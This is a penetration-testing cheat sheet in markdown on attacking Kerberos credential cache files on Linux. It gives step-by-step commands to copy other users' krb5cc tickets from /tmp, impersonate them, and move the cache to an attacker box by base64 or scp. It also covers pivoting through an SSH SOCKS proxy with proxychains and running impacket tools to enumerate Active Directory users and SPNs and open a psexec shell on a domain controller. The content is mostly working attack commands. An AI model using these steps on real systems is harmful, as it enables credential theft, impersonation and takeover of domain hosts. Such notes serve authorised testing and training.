# Kerberos Cache File

## Attacking Credential Cache Files

* if have root access
* can copy cache file
* list cache files

```
ls -al /tmp/krb5cc_*
```

* copy the file and change the ownership

```
sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow  
sudo chown kali:kali /tmp/krb5cc_minenow
```

* To use this you must set the environment variable and destroy any old tickets

```
kdestroy  
klist  
export KRB5CCNAME=/tmp/krb5cc_minenow  
klist
```

* tickets can now be requested on their behalf

```
kvno MSSQLSvc/DC01.test.domain:1433
```

* klist to view the newly added ticket

### Moving the krb5 file to your kali box

```
base64 -w0 filename
echo "b64" | base64 -d > krb5cc_mine
```

Then

```
export KRB5CCNAME=/location/krb5cc_mine
```

Verify

```
klist
```

Then test access with impacket psexec

### Kerberos with Impacket

* in order to perform ticket manipulation, we need to install the kerberos linux client utilities on the kali box

```
apt install krb5-user 
```

* If you screw up the install or need to change something
  * sudo dpkg-reconfigure krb5-config
  * We’ll also have to copy the ccache file previously obtained to our local Kali box

```
scp kali@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow
```

* Next we’ll have to update the environment variable on our local kali box

```
export KRB5CCNAME=/tmp/krb5cc_minenow
```

* We’ll need to update the hosts file to map the hostnames to IP addresses

```
sudo echo '192.168.X.Y dc01.test.domain' >> /etc/hosts
sudo echo '192.168.X.Y test.domain' >> /etc/hosts
```

* Also the source IP address will have to be correct so proxychains will need to be used
* proxychains4.conf will need to comment out DNS

```
sed -i 's/proxy_dns/\#proxy_dns/g' dns.txt
```

* set up a socks server on the pivot host

```
ssh kali@linuxvictim -D 9050
```

* now proxychains & impacket can be used to interact with the remote host

```
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
```

* Gather a list of SPNs available

```
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
```

* get a shell on the remote box

```
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
```

* Renew

```
proxychains kinit -R
```
